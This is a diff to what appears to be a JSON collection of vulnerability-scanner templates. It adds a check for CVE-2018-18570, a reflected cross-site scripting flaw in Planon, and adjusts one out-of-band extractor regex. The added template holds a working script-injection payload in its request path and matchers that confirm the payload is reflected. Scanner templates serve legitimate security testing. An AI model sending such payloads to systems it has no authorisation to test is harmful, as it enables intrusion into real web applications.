@@ -15993,6 +15993,57 @@
       ]
     },
     {
+      "id": "CVE-2018-18570",
+      "info": {
+        "author": "emadshanab",
+        "classification": {
+          "cve-id": "CVE-2018-18570",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Planon before Live Build 41 has XSS",
+        "name": "Cross-Site Scripting on Planon web application",
+        "reference": [
+          "https://www2.deloitte.com/de/de/pages/risk/articles/planon-cross-site-scripting.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-18570"
+        ],
+        "severity": "medium",
+        "tags": "xss,cve,cve2018,planon"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wicket/resource/nl.planon.pssm.dashboard.cre.engine.wicket.page.AbstractDashboardPage/html/nodata.html?nodatamsg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-18775",
       "info": {
         "author": "0x_Akoko",
@@ -31237,7 +31288,7 @@
               "name": "whoami",
               "part": "interactsh_request",
               "regex": [
-                "([a-z0-9]+)\\.([a-z0-9]+)\\.interactsh\\.com"
+                "([a-z0-9]+)\\.([a-z0-9]+)\\.([a-z0-9]+)\\.([a-z]+)"
               ],
               "type": "regex"
             }
